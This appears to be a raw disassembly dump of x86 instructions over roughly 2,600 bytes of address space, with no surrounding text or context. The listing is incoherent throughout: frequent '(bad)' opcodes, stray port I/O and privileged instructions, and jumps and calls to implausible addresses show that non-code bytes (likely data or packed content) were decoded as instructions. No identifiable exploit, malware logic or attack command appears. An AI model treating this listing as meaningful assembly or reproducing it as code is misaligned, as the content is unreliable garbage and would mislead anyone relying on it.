  42f847:	fucomi st,st(7)
  42f849:	call   FWORD PTR [ecx+0x12]
  42f84c:	mov    al,ds:0xf343ba52
  42f851:	cli    
  42f852:	cmp    BYTE PTR [ecx-0x21e68a76],ch
  42f858:	sbb    BYTE PTR [eax],cl
	...
  42f876:	add    BYTE PTR [eax],al
  42f878:	mov    ds:0x4d11df8b,al
  42f87d:	cdq    
  42f87e:	jbe    0x42f870
  42f880:	mov    dh,ch
  42f882:	or     esp,DWORD PTR ds:0x5c2175
  42f888:	or     eax,0x1974c41d
  42f88d:	adc    al,0x92
  42f88f:	jne    0x42f898
  42f891:	xchg   esi,eax
  42f892:	sbb    BYTE PTR [eax],cl
  42f894:	jne    0x42f912
  42f896:	(bad)  
  42f897:	sti    
  42f898:	bound  esi,QWORD PTR [ecx-0x38f29a03]
  42f89e:	mov    dh,BYTE PTR [ebp+0x1]
  42f8a1:	mov    dh,0x18
  42f8a3:	or     BYTE PTR ds:0x42fb90dc,dh
  42f8a9:	adc    ebp,eax
  42f8ab:	pop    edx
  42f8ac:	fcomp  DWORD PTR [edx-0x11]
  42f8af:	(bad)  
  42f8b0:	fldenv [ecx]
  42f8b2:	fwait
  42f8b3:	dec    edi
  42f8b4:	ret    
  42f8b5:	jmp    FWORD PTR [ebp+0x18]
  42f8b8:	stc    
  42f8b9:	cs call 0x1600:0x147aed18
  42f8c1:	or     al,0xed
  42f8c3:	mov    es,WORD PTR [eax+0x788f1ae8]
  42f8c9:	lock adc DWORD PTR [edi-0x78e0780],ecx
  42f8d0:	loop   0x42f8bd
  42f8d2:	sub    BYTE PTR [esp+edx*4],al
  42f8d5:	cmp    eax,DWORD PTR ds:0xa90bcd89
  42f8db:	mov    BYTE PTR [eax],al
	...
  42f8f9:	add    bh,bl
  42f8fb:	or     al,0xb2
  42f8fd:	fwait
  42f8fe:	dec    esp
  42f8ff:	pop    eax
  42f900:	jmp    0xbe038a08
  42f905:	xor    eax,0xaaf5ce8a
  42f90a:	nop
  42f90b:	mov    ?,WORD PTR [ebp-0x26dd05c3]
  42f911:	adc    dl,BYTE PTR [ecx+edi*2-0x13]
  42f915:	scas   al,BYTE PTR es:[edi]
  42f916:	xchg   esp,eax
  42f917:	cmp    ecx,ecx
  42f919:	retf   0x12cc
  42f91c:	out    0x7c,al
  42f91e:	sbb    al,ah
  42f920:	jle    0x42f925
  42f922:	xchg   BYTE PTR [ebx],cl
  42f924:	leave  
  42f925:	mov    ?,ecx
  42f927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f928:	in     eax,0x8e
  42f92a:	add    al,bh
  42f92c:	add    BYTE PTR [edx+0x41ea8571],dl
  42f932:	xor    cl,BYTE PTR [ebx]
  42f934:	or     DWORD PTR [edi],edx
  42f936:	ds cdq 
  42f938:	push   es
  42f939:	adc    DWORD PTR [ebp-0x7b],0xeb57ee5c
  42f940:	pushf  
  42f941:	test   DWORD PTR [edx],0xee170400
  42f947:	(bad)  
  42f948:	call   0xdb1563
  42f94d:	mov    edx,0x64ffffa8
  42f952:	push   ecx
  42f953:	or     al,0x8
  42f955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f956:	cli    
  42f957:	mul    edi
  42f959:	mov    eax,ds:0x62fb898a
	...
  42f97a:	add    BYTE PTR [eax],al
  42f97c:	retf   0x5ae3
  42f97f:	das    
  42f980:	xor    al,0x23
  42f982:	mov    esi,0x522b0ee5
  42f987:	push   ss
  42f988:	mov    BYTE PTR [ebx],cl
  42f98a:	and    al,0xd9
  42f98c:	sub    edx,0x4edbdf
  42f992:	xchg   DWORD PTR [ecx+0x52],esp
  42f995:	cwde   
  42f996:	(bad)  
  42f997:	call   0xd83fc6aa
  42f99c:	mov    esp,0x4c37c046
  42f9a1:	add    BYTE PTR [edx+0x46],dl
  42f9a4:	mov    edx,0xea90dec
  42f9a9:	mov    DWORD PTR ds:0xffc47b7d,esi
  42f9af:	inc    eax
  42f9b0:	sbb    eax,ebx
  42f9b2:	(bad)  
  42f9b3:	call   0x37f6d445
  42f9b8:	dec    esp
  42f9b9:	add    BYTE PTR [eax],al
  42f9bb:	fcmove st,st(6)
  42f9bd:	xor    DWORD PTR [edx+0x4a],esp
  42f9c0:	fnsave [ecx-0x156e16c1]
  42f9c6:	sbb    ebx,ebx
  42f9c8:	into   
  42f9c9:	(bad)  
  42f9ca:	call   0x43031e
  42f9cf:	call   0x8909:0x2ad2c006
  42f9d6:	adc    eax,0xffc45f01
  42f9db:	in     eax,0xb9
  42f9dd:	loop   0x42f99a
  42f9df:	mov    bh,0x0
	...
  42f9fd:	add    ch,cl
  42f9ff:	(bad)  
  42fa00:	(bad)  
  42fa01:	jmp    FWORD PTR [ebx+0x32]
  42fa04:	mov    ah,0xd6
  42fa06:	out    0xfb,eax
  42fa08:	xor    bl,ch
  42fa0a:	repnz (bad) 
  42fa0c:	mov    eax,0x33d0
  42fa11:	call   0x3eaa03
  42fa16:	mov    al,0xc0
  42fa18:	je     0x42fa88
  42fa1a:	sub    ebp,DWORD PTR [ebx]
  42fa1c:	or     eax,0x40c2bc
  42fa21:	mov    esi,DWORD PTR [ecx-0x43d44158]
  42fa27:	add    dl,BYTE PTR [eax+eax*1]
  42fa2a:	inc    ebp
  42fa2b:	sub    ecx,esi
  42fa2d:	inc    ebx
  42fa2e:	hlt    
  42fa2f:	ror    DWORD PTR [esp+ecx*1-0x17b03164],1
  42fa36:	xchg   edi,eax
  42fa37:	mov    dl,0xfb
  42fa39:	jmp    edi
  42fa3b:	mov    ch,BYTE PTR [edi-0x7300882a]
  42fa41:	add    al,0xb
  42fa43:	int3   
  42fa44:	div    BYTE PTR [eax+edx*1-0x6c]
  42fa48:	dec    ebp
  42fa49:	call   0x3ead09
  42fa4e:	rol    BYTE PTR [esi],cl
  42fa50:	sub    eax,0x3fe2bc
  42fa55:	jmp    0x42fa0c
  42fa57:	add    cl,BYTE PTR [ebx+ebx*1]
  42fa5a:	or     al,0xaf
  42fa5c:	aaa    
  42fa5d:	add    BYTE PTR [ebx+edi*2-0x40],dh
  42fa61:	je     0x42fa63
	...
  42fa7f:	add    BYTE PTR [ecx+0x8],dl
  42fa82:	or     eax,0x4022b4
  42fa87:	lea    esp,[eax-0x4c]
  42fa8a:	dec    ebx
  42fa8b:	mov    db7,edx
  42fa8e:	mov    ebx,0xf6fc37d6
  42fa93:	je     0x42faa5
  42fa95:	xchg   esp,eax
  42fa96:	mov    WORD PTR [ecx*1+0x19e833d8],es
  42fa9d:	hlt    
  42fa9e:	add    eax,DWORD PTR [eax]
  42faa0:	stos   DWORD PTR es:[edi],eax
  42faa1:	psubsw mm7,QWORD PTR [ebx+0x6803d663]
  42faa8:	dec    ebp
  42faa9:	arpl   WORD PTR [ebx+0x0],ax
  42faac:	sub    ch,BYTE PTR [ebx+eiz*8+0x2a98cd0d]
  42fab3:	pop    ebx
  42fab4:	mov    ebx,0xd04c1c3
  42fab9:	ret    
  42faba:	inc    ebp
  42fabb:	shl    bl,0xd5
  42fabe:	add    edx,DWORD PTR [edx+0x2]
  42fac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fac2:	out    0xd,eax
  42fac4:	dec    ebp
  42fac5:	cdq    
  42fac6:	sbb    eax,0xd10a5514
  42facb:	scas   eax,DWORD PTR es:[edi]
  42facc:	ret    
  42facd:	aad    0x3
  42facf:	bound  ebp,QWORD PTR [esi+0xd3fae60]
  42fad5:	xor    DWORD PTR [esi+0x3c],ebp
  42fad8:	or     eax,0x4bfd299
  42fadd:	pop    ebp
  42fade:	fild   DWORD PTR [edi]
  42fae0:	cmp    DWORD PTR [esi+eax*4+0x74],ecx
	...
  42faff:	add    BYTE PTR [eax],al
  42fb01:	add    cl,dh
  42fb03:	nop
  42fb04:	das    
  42fb05:	jg     0x42facc
  42fb07:	leave  
  42fb08:	fwait
  42fb09:	xchg   ebp,eax
  42fb0a:	out    dx,eax
  42fb0b:	cwde   
  42fb0c:	call   DWORD PTR [ecx+0x6e]
  42fb0f:	sub    BYTE PTR [esi-0xf1df2c1],ch
  42fb15:	sbb    edi,edi
  42fb17:	pop    eax
  42fb18:	call   FWORD PTR [ecx+0x4f]
  42fb1b:	pushf  
  42fb1c:	call   DWORD PTR [esi+edx*4-0x14]
  42fb20:	and    ah,0x75
  42fb23:	pop    ss
  42fb24:	cwde   
  42fb25:	je     0x42fb35
  42fb27:	cdq    
  42fb28:	dec    DWORD PTR [esi-0x3d]
  42fb2b:	imul   edi,DWORD PTR [edx+0x7d],0x8a6c0015
  42fb32:	push   es
  42fb33:	jl     0x42fb4f
  42fb35:	add    eax,0x85c1000d
  42fb3a:	outs   dx,DWORD PTR ds:[esi]
  42fb3b:	(bad)  
  42fb3c:	call   0x6d3548c0
  42fb41:	aad    0xd
  42fb43:	add    cl,ch
  42fb45:	jle    0x42fb15
  42fb47:	sti    
  42fb48:	repz add al,0x2b
  42fb4b:	sub    cl,0xfa
  42fb4e:	mov    DWORD PTR [esi-0x17],ecx
  42fb51:	add    ecx,DWORD PTR ds:0xd2b1a918
  42fb57:	call   DWORD PTR [ecx+0x28ee22f0]
  42fb5d:	add    al,0x6f
  42fb5f:	jge    0x42fb25
  42fb61:	dec    ebx
  42fb62:	fistp  QWORD PTR ds:0x3e9
	...
  42fb84:	push   es
  42fb85:	jp     0x42fbeb
  42fb87:	add    ecx,DWORD PTR ds:0xe68a3100
  42fb8d:	add    cl,ch
  42fb8f:	and    DWORD PTR [ebx+edi*8],ecx
  42fb92:	mov    al,ds:0x640012b1
  42fb97:	psllw  mm3,mm3
  42fb9a:	nop
  42fb9b:	ins    DWORD PTR es:[edi],dx
  42fb9c:	or     eax,0x5e9be900
  42fba1:	mov    esi,0xba8a8a3a
  42fba6:	cdq    
  42fba7:	fwait
  42fba8:	xchg   edx,eax
  42fba9:	psubsw mm0,QWORD PTR [ebx]
  42fbac:	xchg   esp,eax
  42fbad:	cmp    al,0xcd
  42fbaf:	not    DWORD PTR [ecx-0x7fd96a40]
  42fbb5:	or     al,0xcd
  42fbb7:	mov    edx,0xd03e968
  42fbbd:	cwde   
  42fbbe:	rol    ch,0x76
  42fbc1:	sub    DWORD PTR [edi+ecx*1+0x29],0xf930fff0
  42fbc9:	(bad)  
  42fbca:	(bad)  
  42fbcb:	call   0xe700d556
  42fbd0:	test   BYTE PTR [edi-0x50],bl
  42fbd3:	mov    bh,0xc8
  42fbd5:	inc    DWORD PTR [ecx+ebp*4-0x26797de3]
  42fbdc:	xchg   esp,eax
  42fbdd:	jmp    0x42fbf6
  42fbdf:	fcmove st,st(6)
  42fbe1:	dec    DWORD PTR [edi-0x42]
  42fbe4:	inc    edx
  42fbe5:	ins    DWORD PTR es:[edi],dx
  42fbe6:	fisubr WORD PTR [edx]
	...
  42fc04:	add    BYTE PTR [eax],al
  42fc06:	adc    DWORD PTR [ebx+0x44],esi
  42fc09:	add    eax,0x62502dcd
  42fc0e:	or     eax,0x9be8ffff
  42fc13:	inc    ebx
  42fc14:	and    al,0x61
  42fc16:	push   cs
  42fc17:	add    BYTE PTR [eax],al
  42fc19:	sbb    DWORD PTR [edx+0x79e8ffd9],0x89dd240c
  42fc23:	mov    ebx,0x2fcc6210
  42fc28:	call   0x434fe0
  42fc2d:	jb     0x42fc3e
  42fc2f:	cs sti 
  42fc31:	mov    ecx,0xe17d79d6
  42fc36:	es rcl dl,0xaa
  42fc3a:	push   cs
  42fc3b:	test   DWORD PTR ds:0xffc0c0e5,edx
  42fc41:	push   ecx
  42fc42:	push   ds
  42fc43:	ret    
  42fc44:	jmp    edi
  42fc46:	push   cs
  42fc47:	add    BYTE PTR [ebp-0x3d],dh
  42fc4a:	mov    DWORD PTR [eax+ecx*1],eax
  42fc4d:	add    bh,ch
  42fc4f:	sbb    ecx,DWORD PTR [ebp+0x5008b2a5]
  42fc55:	push   ss
  42fc56:	jp     0x42fc54
  42fc58:	adc    ebp,DWORD PTR [ecx+0xc07b0e]
  42fc5e:	clc    
  42fc5f:	shl    DWORD PTR [ecx+0x0],1
  42fc62:	sahf   
  42fc63:	test   DWORD PTR [esp+eax*2-0x72b46ba8],ecx
	...
  42fc86:	add    BYTE PTR [eax],al
  42fc88:	call   0x64437c2c
  42fc8d:	cld    
  42fc8e:	dec    edi
  42fc8f:	(bad)  
  42fc91:	aas    
  42fc92:	push   es
  42fc93:	and    eax,0xfffffc63
  42fc98:	add    al,0x77
  42fc9a:	outs   dx,DWORD PTR ds:[esi]
  42fc9b:	or     BYTE PTR [ebx-0x6f],dl
  42fc9e:	das    
  42fc9f:	adc    al,0xe4
  42fca1:	sti    
  42fca2:	test   al,al
  42fca4:	loop   0x42fc4e
  42fca6:	jp     0x42fca0
  42fca8:	xor    eax,0xf3830cf1
  42fcad:	add    DWORD PTR [ebx],0x75
  42fcb0:	sbb    eax,0x348affe4
  42fcb5:	add    al,0xe3
  42fcb7:	push   ss
  42fcb8:	adc    edi,DWORD PTR [ecx+eiz*2-0x7d]
  42fcbc:	adc    BYTE PTR [eax+0xb],ah
  42fcbf:	and    dh,dh
  42fcc1:	jb     0x42fced
  42fcc3:	leave  
  42fcc4:	sbb    bh,bl
  42fcc6:	dec    ebx
  42fcc7:	inc    esp
  42fcc8:	(bad)  
  42fcc9:	test   BYTE PTR [ebx+0x24],0xd4
  42fccd:	xor    ebp,eax
  42fccf:	imul   esi,DWORD PTR [ecx],0xffffff88
  42fcd2:	not    DWORD PTR [edi+0x63]
  42fcd5:	outs   dx,BYTE PTR ds:[esi]
  42fcd6:	stos   DWORD PTR es:[edi],eax
  42fcd7:	adc    al,0x74
  42fcd9:	add    edx,DWORD PTR [edi+0x5e]
  42fcdc:	outs   dx,DWORD PTR ds:[esi]
  42fcdd:	cld    
  42fcde:	in     al,0x5d
  42fce0:	out    0x7e,al
  42fce2:	sti    
  42fce3:	push   esp
  42fce4:	das    
  42fce5:	xchg   edi,eax
  42fce6:	dec    esi
  42fce7:	mov    ebx,DWORD PTR [ecx+0x7b]
  42fcea:	dec    esi
  42fceb:	push   esi
	...
  42fd08:	add    BYTE PTR [eax],al
  42fd0a:	rep ins DWORD PTR es:[edi],dx
  42fd0c:	(bad)  
  42fd0d:	adc    al,0x64
  42fd0f:	add    eax,DWORD PTR [ebx+0x1e00df8]
  42fd15:	or     BYTE PTR [ebp+0x6e],dh
  42fd18:	pop    edx
  42fd19:	add    BYTE PTR ds:0xa75beed,cl
  42fd1f:	repnz mov edi,0xff6998e9
  42fd25:	dec    DWORD PTR [eax-0x707c0c92]
  42fd2b:	imul   edi,edi,0x55f8eff
  42fd31:	je     0x42fd4a
  42fd33:	jmp    0xfa7e:0x63b90d81
  42fd3a:	adc    bh,BYTE PTR [edi+ecx*1]
  42fd3d:	dec    edi
  42fd3e:	fidivr DWORD PTR [ebp+0x28fc6ff1]
  42fd44:	add    al,0x87
  42fd46:	inc    ebp
  42fd47:	in     al,0xa6
  42fd49:	je     0x42fcfc
  42fd4b:	icebp  
  42fd4c:	mov    ecx,0x7e7b9948
  42fd51:	call   0x7f401a69
  42fd56:	cmc    
  42fd57:	data16 adc BYTE PTR [eax],bl
  42fd5a:	xchg   BYTE PTR [ecx+0x135e1397],al
  42fd60:	add    eax,0x9bf5d57f
  42fd65:	mov    ch,0x2d
  42fd67:	imul   edi,edi,0xfbd1d586
  42fd6d:	dec    esi
	...
  42fd8a:	add    BYTE PTR [eax],al
  42fd8c:	imul   edx,DWORD PTR [bp-0x6915],0xc284f753
  42fd95:	push   esp
  42fd96:	fdivr  DWORD PTR [ecx+0x3f1ecd]
  42fd9c:	pop    ebx
  42fd9d:	ds icebp 
  42fd9f:	pop    ss
  42fda0:	jmp    FWORD PTR [eax-0x23769801]
  42fda6:	inc    ebx
  42fda7:	add    BYTE PTR [ebp-0x6977cd01],ah
  42fdad:	jle    0x42fd61
  42fdaf:	fwait
  42fdb0:	push   ebp
  42fdb1:	jnp    0x42fdc5
  42fdb3:	xchg   edi,ebx
  42fdb5:	jle    0x42fdab
  42fdb7:	out    0x8,eax
  42fdb9:	shr    al,0xca
  42fdbc:	jnp    0x42fdb1
  42fdbe:	loop   0x42fdee
  42fdc0:	jne    0x42fda5
  42fdc2:	scas   al,BYTE PTR es:[edi]
  42fdc3:	add    ecx,DWORD PTR ds:0x57fb747f
  42fdc9:	adc    al,0x5d
  42fdcb:	cmc    
  42fdcc:	adc    al,BYTE PTR [eax]
  42fdce:	ds jnp 0x42fda1
  42fdd1:	pop    es
  42fdd2:	xor    ah,BYTE PTR [esi]
  42fdd4:	loopne 0x42fe17
  42fdd6:	in     eax,0x3
  42fdd8:	fimul  WORD PTR [edx+0x67de34c1]
  42fdde:	js     0x42fde4
  42fde0:	or     eax,0xa5c36c00
  42fde5:	lock arpl WORD PTR [ecx-0x29a0fb60],si
  42fdec:	pushf  
  42fded:	mov    edi,0xd2e8
	...
  42fe0e:	retf   0x6bd1
  42fe11:	mov    esp,0x1d11678
  42fe16:	adc    edx,0x578866b
  42fe1c:	inc    ecx
  42fe1d:	cs or  eax,0x3c9a6905
  42fe23:	mov    eax,0x800e03ef
  42fe28:	dec    esi
  42fe29:	inc    ebx
  42fe2a:	aas    
  42fe2b:	jge    0x42fe02
  42fe2d:	fistp  WORD PTR [esi]
  42fe2f:	mov    ebx,eax
  42fe31:	xchg   BYTE PTR [ebx-0x2a],dl
  42fe34:	mov    cl,0xd2
  42fe36:	jecxz  0x42feb5
  42fe38:	fmul   QWORD PTR [ebx]
  42fe3a:	pop    ds
  42fe3b:	shr    al,0x82
  42fe3e:	rcl    DWORD PTR [eax],1
  42fe40:	add    BYTE PTR [eax+0x14],dh
  42fe43:	add    BYTE PTR [ebx],al
  42fe45:	imul   ecx,DWORD PTR [ebp-0x380987c0],0x1df2733f
  42fe4f:	add    ecx,DWORD PTR [eax+0x96648f5]
  42fe55:	bound  ebx,QWORD PTR [esi+0x6a710565]
  42fe5b:	aaa    
  42fe5c:	xchg   DWORD PTR [eax],esp
  42fe5e:	(bad)  
  42fe60:	xchg   DWORD PTR [edx],ebp
  42fe62:	sub    BYTE PTR [ebx+0x365a70d7],al
  42fe68:	fstp   DWORD PTR [edi+edx*2-0x7a]
  42fe6c:	dec    esp
  42fe6d:	add    eax,0x5dc98445
	...
  42fe8e:	add    BYTE PTR [eax],al
  42fe90:	ja     0xbe3330cf
  42fe96:	or     cl,ch
  42fe98:	std    
  42fe99:	rol    BYTE PTR [esi-0x182f213f],1
  42fe9f:	add    al,0xe
  42fea1:	add    BYTE PTR [eax],al
  42fea3:	cli    
  42fea4:	gs xor eax,0x34fa25bf
  42feaa:	iret   
  42feab:	adc    al,0xa
  42fead:	mov    bl,0x58
  42feaf:	sbb    eax,0xa92f0049
  42feb4:	les    eax,FWORD PTR [ebp+0x75]
  42feb7:	ficom  WORD PTR [eax]
  42feb9:	aaa    
  42feba:	push   ss
  42febb:	cmc    
  42febc:	and    DWORD PTR ds:0xb4e1fcf7,esi
  42fec2:	push   ebx
  42fec3:	jmp    0xb829fba1
  42fec8:	inc    esi
  42fec9:	idiv   bh
  42fecb:	in     eax,0x8e
  42fecd:	fs cmp eax,0x23f389bf
  42fed3:	cmc    
  42fed4:	inc    ebx
  42fed5:	out    dx,eax
  42fed6:	cli    
  42fed7:	add    BYTE PTR [esi-0x3e00b0d6],dl
  42fedd:	or     al,0xe
  42fedf:	inc    eax
  42fee0:	mov    ah,0x7f
  42fee2:	les    edx,FWORD PTR [eax]
  42fee4:	sbb    eax,0x2407000a
  42fee9:	std    
  42feea:	mov    edi,0xc1477e78
  42feef:	ja     0x42ff63
  42fef1:	or     al,0xfe
  42fef3:	mov    al,BYTE PTR [eax]
	...
  42ff11:	add    BYTE PTR [edi+edx*4],dl
  42ff14:	or     BYTE PTR [ebx+0x66bb4f2d],cl
  42ff1a:	(bad)  
  42ff1c:	outs   dx,BYTE PTR ds:[esi]
  42ff1d:	lea    ebx,[eax-0x753c7cf5]
  42ff23:	std    
  42ff24:	sar    BYTE PTR [ecx+0x60],cl
  42ff27:	inc    edi
  42ff28:	fdiv   DWORD PTR [ebp+0x3e]
  42ff2b:	test   DWORD PTR [ebx+0x24],0x74c8fd28
  42ff32:	es stc 
  42ff34:	cmp    BYTE PTR [edi-0x11],bl
  42ff37:	inc    ecx
  42ff38:	or     BYTE PTR [eax],al
  42ff3a:	mov    cl,0xb9
  42ff3c:	je     0x42ff70
  42ff3e:	pushf  
  42ff3f:	xor    edi,0xffffffff
  42ff42:	jmp    0x42ff6e
  42ff44:	adc    eax,0x37
  42ff47:	add    DWORD PTR [eax+0x40bf439],0x41
  42ff4e:	cs or  ebp,edi
  42ff51:	test   DWORD PTR [esi+0x13bf050a],esi
  42ff57:	add    al,0xff
  42ff59:	jg     0x42ffcc
  42ff5b:	lea    esi,[ebp+ecx*1+0x71]
  42ff5f:	test   BYTE PTR [eax+0x6],bh
  42ff62:	iret   
  42ff63:	inc    ecx
  42ff64:	mov    DWORD PTR [esi],eax
  42ff66:	aas    
  42ff67:	add    BYTE PTR [ebx+0x26],bh
  42ff6a:	mov    ah,0xf8
  42ff6c:	mov    esi,0xf9be0d5f
  42ff71:	mov    bh,0x62
  42ff73:	imul   edi,esp,0x7f
	...
  42ff91:	add    BYTE PTR [eax],al
  42ff93:	add    BYTE PTR [eax-0x6ffcf9d7],cl
  42ff99:	xor    ecx,DWORD PTR [ebx]
  42ff9b:	dec    DWORD PTR [edi-0x6f40fbf5]
  42ffa1:	and    BYTE PTR [ebx],cl
  42ffa3:	xor    al,0x55
  42ffa5:	and    al,BYTE PTR [ebx+edi*8-0x2f874df6]
  42ffac:	adc    bl,BYTE PTR ds:0xfd953439
  42ffb3:	jle    0x430001
  42ffb5:	cmp    DWORD PTR [di+0x60],esi
  42ffb9:	in     al,0xb0
  42ffbb:	jne    0x42ffc5
  42ffbd:	xor    ch,BYTE PTR [eax+eax*1]
  42ffc0:	adc    ch,cl
  42ffc2:	jns    0x42ffb6
  42ffc4:	fnstenv [ebx-0x78]
  42ffc7:	sti    
  42ffc8:	lds    esp,FWORD PTR [edx+0x2a]
  42ffcb:	mov    esi,0xff6a6b94
  42ffd0:	pop    DWORD PTR [ebx]
  42ffd2:	add    al,0x87
  42ffd4:	dec    edx
  42ffd5:	and    ch,BYTE PTR [ebx+0x5]
  42ffd8:	adc    al,BYTE PTR gs:[ebx+eax*1]
  42ffdc:	(bad)  
  42ffdd:	in     al,dx
  42ffde:	inc    ebx
  42ffdf:	jns    0x42fff3
  42ffe1:	in     al,0x75
  42ffe3:	je     0x42fff3
  42ffe5:	out    0x25,al
  42ffe7:	add    dh,cl
  42ffe9:	push   ebp
  42ffea:	aas    
  42ffeb:	aaa    
  42ffec:	aad    0x1c
  42ffee:	push   cs
  42ffef:	xor    DWORD PTR [edx+ecx*4],0x7772fb7f
  42fff6:	or     DWORD PTR [eax+0x0],edi
	...
  430014:	add    BYTE PTR [eax],al
  430016:	inc    edx
  430017:	imul   eax,DWORD PTR [esi],0x5afce80
  43001d:	jne    0x430028
  43001f:	mov    ds:0x595802,al
  430024:	test   eax,0xd5480203
  430029:	add    eax,0x37260094
  43002e:	int    0x38
  430030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430031:	daa    
  430032:	or     ebp,esi
  430034:	jmp    0x8f8:0xf124513c
  43003b:	xor    DWORD PTR [ebp+0x2a7b0527],0xebf21683
  430045:	mov    ebx,0x83e1ffde
  43004a:	ret    
  43004b:	pop    es
  43004c:	jmp    0x7f15dd27
  430051:	xor    eax,0x43b66d8a
  430056:	cmp    dl,BYTE PTR [edi-0x66]
  430059:	cs pop esp
  43005b:	mov    WORD PTR [edx+0x50],ds
  43005e:	push   esi
  43005f:	jp     0x4300cb
  430061:	mov    BYTE PTR [ebx-0xd],al
  430064:	repnz lea esp,[ecx]
  430067:	or     ah,BYTE PTR [ebp+0x55]
  43006a:	mov    ecx,0xcc146102
  43006f:	mov    esi,0x842af919
  430074:	ret    0xff8
  430077:	leave  
  430078:	sub    eax,0xbc
	...
  430095:	add    BYTE PTR [eax],al
  430097:	add    BYTE PTR [ebx+0x4f83e9ff],bl
  43009d:	add    cl,ch
  43009f:	mov    es,ecx
  4300a1:	and    edi,ecx
  4300a3:	mov    ah,dl
  4300a5:	hlt    
  4300a6:	out    0x8c,al
  4300a8:	and    al,0xd9
  4300aa:	xor    bl,bh
  4300ac:	mov    eax,0x8bd8e904
  4300b1:	ins    BYTE PTR es:[edi],dx
  4300b2:	sbb    BYTE PTR [edi-0x29168390],al
  4300b8:	cmp    al,0x85
  4300ba:	add    BYTE PTR [ebx+0x23],bh
  4300bd:	push   ecx
  4300be:	test   DWORD PTR [edi-0x26],esi
  4300c1:	sbb    dl,BYTE PTR [ebx+0x72]
  4300c4:	or     eax,0x9560270c
  4300c9:	inc    eax
  4300ca:	je     0x4300c9
  4300cc:	pop    ds
  4300cd:	lods   eax,DWORD PTR ds:[esi]
  4300ce:	adc    al,0xde
  4300d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300d1:	test   dh,cl
  4300d3:	mov    ebp,0xd888de1b
  4300d8:	mov    edi,DWORD PTR [edi]
  4300da:	(bad)  
  4300db:	mov    al,ds:0x4174c7d3
  4300e0:	scas   eax,DWORD PTR es:[edi]
  4300e1:	test   dl,dh
  4300e3:	pushf  
  4300e4:	sbb    edi,ecx
  4300e6:	call   0x458154d6
  4300eb:	adc    eax,0x69027978
  4300f0:	cmp    eax,DWORD PTR [eax+0x62]
  4300f3:	jo     0x430106
  4300f5:	add    DWORD PTR [ebp-0xf],0xeb744095
	...
  430118:	add    BYTE PTR [eax],al
  43011a:	mov    DWORD PTR [eax],ebx
  43011c:	xchg   DWORD PTR [edx+edx*8-0x2c4fa92b],esp
  430123:	pop    es
  430124:	add    BYTE PTR [eax+edx*4],dh
  430127:	ins    BYTE PTR es:[edi],dx
  430128:	push   ecx
  430129:	ins    BYTE PTR es:[edi],dx
  43012a:	(bad)  
  43012b:	repnz add ebx,DWORD PTR [edx]
  43012e:	leave  
  43012f:	inc    esi
  430130:	mov    edi,0xfbf39a1f
  430135:	ror    ebx,1
  430137:	jne    0x430134
  430139:	mov    dh,0x2f
  43013b:	test   al,al
  43013d:	xor    eax,0xa6c7f90a
  430142:	push   esi
  430143:	mov    ecx,0x468d2487
  430148:	mov    edi,0x516b883c
  43014d:	fs inc esi
  43014f:	repz add eax,DWORD PTR [eax]
  430152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430153:	mov    esp,0x88fac3c8
  430158:	jne    0x430156
  43015a:	mov    WORD PTR [esi-0x7],ss
  43015d:	jmp    DWORD PTR [ebx+0x5e]
  430160:	test   al,al
  430162:	call   0x640b7c68
  430167:	lds    edi,FWORD PTR [edx-0x37079675]
  43016d:	ret    
  43016e:	jns    0x4300fb
  430170:	in     al,dx
  430171:	jmp    FWORD PTR [ecx+0x4]
  430174:	push   ecx
  430175:	call   0x3a7f5f
  43017a:	sub    esp,eax
  43017c:	ja     0x4301b4
	...
  43019a:	add    BYTE PTR [eax],al
  43019c:	sub    edx,edx
  43019e:	je     0x4301a5
  4301a0:	out    dx,al
  4301a1:	pop    ebx
  4301a2:	outs   dx,DWORD PTR ds:[esi]
  4301a3:	inc    eax
  4301a4:	je     0x4301d9
  4301a6:	sar    BYTE PTR [ecx],0xa9
  4301a9:	add    al,0x75
  4301ab:	adc    al,0x8a
  4301ad:	xor    eax,0xf75573fa
  4301b2:	fcomp  DWORD PTR [ebx]
  4301b4:	sbb    eax,0xf123e183
  4301b9:	jl     0x43020a
  4301bb:	add    BYTE PTR [ebx+0x7c],ch
  4301be:	jecxz  0x4301d2
  4301c0:	push   es
  4301c1:	mov    edx,DWORD PTR [ebp+0x8]
  4301c4:	mov    cl,0x41
  4301c6:	add    edx,DWORD PTR [eax-0x64]
  4301c9:	jle    0x4301c2
  4301cb:	inc    ebx
  4301cd:	jmp    0x4301e1
  4301cf:	call   DWORD PTR [ebx+0x7f]
  4301d2:	pop    ebp
  4301d3:	ret    0xfc28
  4301d6:	push   esp
  4301d7:	mov    edx,DWORD PTR [eax+0x4d]
  4301da:	push   ecx
  4301db:	mov    ecx,ebp
  4301dd:	jg     0x430162
  4301df:	inc    ebp
  4301e0:	cld    
  4301e1:	pop    eax
  4301e2:	xor    cl,0x3a
  4301e5:	mov    eax,DWORD PTR [ebp+0x8]
  4301e8:	or     eax,0xf2fa9b81
  4301ed:	xchg   BYTE PTR [edx-0x74d39a40],al
  4301f3:	dec    ebp
  4301f4:	loope  0x4301da
  4301f6:	rol    DWORD PTR [edi],1
  4301f8:	in     eax,0x1
  4301fa:	jle    0x4301f7
  4301fc:	rcr    ah,cl
  4301fe:	ds js  0x430201
	...
  43021d:	add    BYTE PTR [eax],al
  43021f:	in     al,0x7f
  430221:	jne    0x430244
  430223:	and    bl,bh
  430225:	sti    
  430226:	inc    ecx
  430227:	adc    al,0x8d
  430229:	dec    ebp
  43022a:	add    eax,0x2139363f
  43022f:	or     al,0x79
  430231:	fiadd  DWORD PTR [esi]
  430233:	das    
  430234:	test   dl,ah
  430236:	out    dx,al
  430237:	fisttp DWORD PTR [eax+0x7f5e0d53]
  43023d:	out    0x2b,eax
  43023f:	push   ds
  430240:	repnz pop es
  430242:	nop
  430243:	pushf  
  430244:	pop    es
  430245:	push   eax
  430246:	xchg   BYTE PTR [ebx+edi*2+0x50e25a87],ah
  43024d:	call   0xfbc301f9
  430252:	jbe    0x4302c4
  430254:	cmp    bl,0xe1
  430257:	arpl   WORD PTR [ecx+ecx*8],si
  43025a:	jmp    0x43023b
  43025c:	adc    BYTE PTR [edx+0x54],bl
  43025f:	stos   DWORD PTR es:[edi],eax
